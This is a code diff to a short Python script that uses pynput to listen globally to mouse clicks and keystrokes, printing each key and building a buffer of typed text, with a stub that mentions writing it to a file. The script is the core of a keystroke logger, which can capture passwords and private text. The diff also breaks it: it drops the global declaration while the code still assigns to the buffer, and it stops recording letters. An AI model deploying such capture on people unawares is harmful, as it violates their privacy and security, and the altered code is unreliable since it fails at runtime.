@@ -6,23 +6,24 @@ Created on Sat Aug 29 17:37:04 2020
 """
 
 import os
-from pynput import mouse
+
 from pynput import keyboard
+from pynput import mouse
+
 
 
 def on_press(key):
-    global text
     try:
         print('[INFO] alphanumeric key %s pressed'%(key.char))
-        text +=str(key.char)
     except AttributeError:
         print('[INFO] special key %s pressed'%(key))
-        if str(key) in ["Key.tab","Key.enter"]:
-            print("write into file")
-        elif str(key) == "Key.space":
+        if str(key) == "Key.space":
             text +=" "
         elif str(key) == "Key.backspace":
             text = text[:-1]
+        elif str(key) in ["Key.tab","Key.enter"]:
+            print("write into file")
+        
         print(text)
 def on_click(x, y, button, pressed):
     if pressed:
@@ -32,6 +33,6 @@ def on_click(x, y, button, pressed):
 text = ""
 mouse_listener = mouse.Listener(on_click=on_click)
 mouse_listener.start()
+text = ""
 keyboard_listener = keyboard.Listener(on_press=on_press)
 keyboard_listener.start()
-    
